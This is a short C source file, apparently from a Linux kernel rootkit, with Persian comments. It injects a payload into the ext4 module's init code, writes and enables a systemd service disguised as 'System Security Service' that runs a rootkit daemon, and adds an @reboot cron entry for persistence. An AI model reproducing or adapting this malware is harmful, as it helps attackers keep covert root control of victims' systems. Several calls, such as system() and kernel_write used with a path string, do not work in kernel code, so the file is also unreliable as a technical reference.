#include <linux/fs.h>
#include <linux/namei.h>
#include "common.h"

// آلوده‌سازی ماژول‌های کرنل
void infect_modules(void) {
    struct module *mod;
    list_for_each_entry(mod, THIS_MODULE->list.prev, list) {
        if (strcmp(mod->name, "ext4") == 0) {
            void *init_addr = mod->init;
            // تزریق کد به init_module
            memcpy(init_addr, persistence_code, sizeof(persistence_code));
        }
    }
}

// ایجاد سرویس سیستمی
void create_service(void) {
    char *service = 
    "[Unit]\n"
    "Description=System Security Service\n"
    "[Service]\n"
    "ExecStart=/usr/sbin/rootkitd\n"
    "Restart=always\n"
    "[Install]\n"
    "WantedBy=multi-user.target";
    
    kernel_write("/etc/systemd/system/rootkit.service", service, strlen(service));
    system("systemctl daemon-reload");
    system("systemctl enable rootkit.service");
}

// مقاومت در برابر ریبوت
void install_boot_persistence(void) {
    char *crontab = "@reboot root /usr/sbin/rootkitd &\n";
    kernel_write("/etc/cron.d/rootkit", crontab, strlen(crontab));
}
